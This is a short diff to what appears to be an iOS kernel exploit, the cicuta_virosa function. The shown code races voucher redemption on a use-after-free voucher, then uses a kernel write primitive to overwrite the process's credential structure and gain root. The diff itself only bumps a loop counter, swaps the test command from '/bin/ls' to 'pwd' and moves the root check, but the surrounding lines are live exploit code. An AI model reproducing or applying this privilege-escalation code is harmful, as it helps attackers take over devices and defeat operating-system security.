@@ -231,6 +231,7 @@ void write_20(uint64_t addr, const void* buf)
 
 void cicuta_virosa(void)
 {
+    
     int* race_flag = malloc(sizeof(int));
     struct redeem_race_context* context = malloc(sizeof(struct redeem_race_context));
     context->start_flag = race_flag;
@@ -327,7 +328,7 @@ stage1:
     {
         assert(redeem_voucher(uafed_voucher, &redeemed_voucher) == KERN_SUCCESS);
         c++;
-        if (c == 100000) {
+        if (c == 1000000) {
             cicuta_log_one(".");
             c = 0;
         }
@@ -397,25 +398,25 @@ stage1:
     uint32_t creds[5] = {0, 0, 0, 1, 0};
     write_20(ucred + 0x18, (void*)creds);
 
-    uint32_t uid = getuid();
-    cicuta_log("getuid() returns %u", uid);
-    cicuta_log("whoami: %s", uid == 0 ? "root" : "mobile");
     
-    cicuta_log("Trying to run /bin/ls");
+    cicuta_log("Trying to run 'pwd'");
     
     FILE *pros;
     char path[1035];
     
-    pros = popen("/bin/ls","r");
+    pros = popen("pwd","r");
     if (pros == NULL) {
         cicuta_log("Failed to run process");
     } else {
         while (fgets(path, sizeof(path), pros) != NULL) {
             cicuta_log("%s", path);
-          }
+        }
     }
     pclose(pros);
     
+    uint32_t uid = getuid();
+    cicuta_log("getuid() returns %u", uid);
+    cicuta_log("whoami: %s", uid == 0 ? "root" : "mobile");
 
 err:
     free(redeem_racers);
